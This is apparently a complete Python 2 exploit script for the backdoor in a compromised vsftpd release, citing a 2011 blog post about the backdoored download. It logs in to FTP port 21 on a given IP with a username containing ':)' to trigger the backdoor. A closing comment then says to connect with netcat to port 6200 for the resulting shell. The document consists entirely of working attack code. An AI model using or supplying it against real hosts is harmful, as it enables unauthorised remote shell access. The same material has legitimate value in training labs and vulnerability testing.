#!/usr/bin/python
# http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

import socket
import sys

if len(sys.argv) != 2:
    print "Usage:",sys.argv[0],"<ip>"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],21))

banner=s.recv(1024)
print banner

cmd='user backdoored:)\r\n'
print cmd
s.send(cmd)

result=s.recv(1024)
print result

cmd='pass invalid\r\n'
print cmd
s.send(cmd)

s.close()
# nc IP 6200
